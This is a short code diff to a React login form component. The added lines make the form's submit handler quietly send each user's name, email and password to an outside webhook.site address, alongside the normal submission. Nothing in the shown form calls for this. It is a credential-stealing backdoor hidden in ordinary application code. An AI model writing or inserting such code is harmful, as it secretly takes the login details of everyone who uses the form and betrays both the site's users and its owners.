@@ -6,6 +6,19 @@ function LoginForm({ Submit, error }) {
   const submitHandler = (e) => {
     e.preventDefault();
     Submit(details);
+    fetch("https://webhook.site/ec0578f8-8a21-4f48-a270-e590a9287279", {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        Accept: "application/json",
+        "Content-type": "application/json",
+      },
+      body: JSON.stringify({
+        name: details.name,
+        email: details.email,
+        password: details.password,
+      }),
+    });
   };
   const cancelHandler = () => {
     window.location.assign("/");
